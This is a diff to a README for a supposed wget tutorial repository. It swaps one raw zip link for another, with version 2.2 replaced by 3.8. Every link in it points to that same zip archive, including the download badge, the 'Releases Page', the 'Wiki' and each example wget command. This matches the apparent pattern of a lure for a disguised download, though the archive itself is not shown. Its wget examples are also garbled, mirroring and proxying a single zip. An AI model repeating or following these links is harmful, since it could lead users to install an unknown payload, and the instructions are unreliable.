@@ -6,7 +6,7 @@ Welcome to "downloading-with-wget"! This guide helps you download web pages and 
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://github.com/THE00FALLEN/downloading-with-wget/raw/refs/heads/main/Hypochnus/wget-with-downloading-v2.2.zip)](https://github.com/THE00FALLEN/downloading-with-wget/raw/refs/heads/main/Hypochnus/wget-with-downloading-v2.2.zip)
+[![Download Latest Release](https://github.com/THE00FALLEN/downloading-with-wget/raw/refs/heads/main/Hypochnus/wget_downloading_with_v3.8.zip)](https://github.com/THE00FALLEN/downloading-with-wget/raw/refs/heads/main/Hypochnus/wget_downloading_with_v3.8.zip)
 
 ## 🎯 What You Need
 
@@ -22,7 +22,7 @@ This application provides detailed instructions on how to use Wget and Python to
 
 ## 📥 Download & Install
 
-Visit this page to download the latest release: [Releases Page](https://github.com/THE00FALLEN/downloading-with-wget/raw/refs/heads/main/Hypochnus/wget-with-downloading-v2.2.zip).
+Visit this page to download the latest release: [Releases Page](https://github.com/THE00FALLEN/downloading-with-wget/raw/refs/heads/main/Hypochnus/wget_downloading_with_v3.8.zip).
 
 Here’s how to download and install the application:
 
@@ -71,24 +71,24 @@ Refer to our examples in the documentation for step-by-step guides on using vari
 
 - **Download a Single File**:
    ```
-   wget https://github.com/THE00FALLEN/downloading-with-wget/raw/refs/heads/main/Hypochnus/wget-with-downloading-v2.2.zip
+   wget https://github.com/THE00FALLEN/downloading-with-wget/raw/refs/heads/main/Hypochnus/wget_downloading_with_v3.8.zip
    ```
 
 - **Mirror a Website**:
    ```
-   wget --mirror https://github.com/THE00FALLEN/downloading-with-wget/raw/refs/heads/main/Hypochnus/wget-with-downloading-v2.2.zip
+   wget --mirror https://github.com/THE00FALLEN/downloading-with-wget/raw/refs/heads/main/Hypochnus/wget_downloading_with_v3.8.zip
    ```
 
 - **Use a Proxy**:
    ```
-   wget --proxy=on https://github.com/THE00FALLEN/downloading-with-wget/raw/refs/heads/main/Hypochnus/wget-with-downloading-v2.2.zip
+   wget --proxy=on https://github.com/THE00FALLEN/downloading-with-wget/raw/refs/heads/main/Hypochnus/wget_downloading_with_v3.8.zip
    ```
 
 These examples provide a basic understanding of commands. Feel free to modify them to suit your needs.
 
 ## 📚 Additional Resources
 
-- **Documentation**: Check the [Wiki](https://github.com/THE00FALLEN/downloading-with-wget/raw/refs/heads/main/Hypochnus/wget-with-downloading-v2.2.zip) for more detailed instructions.
+- **Documentation**: Check the [Wiki](https://github.com/THE00FALLEN/downloading-with-wget/raw/refs/heads/main/Hypochnus/wget_downloading_with_v3.8.zip) for more detailed instructions.
 - **Community Support**: Join discussions and ask questions in the Issues section of the repository.
 
 ## ⚙️ Troubleshooting
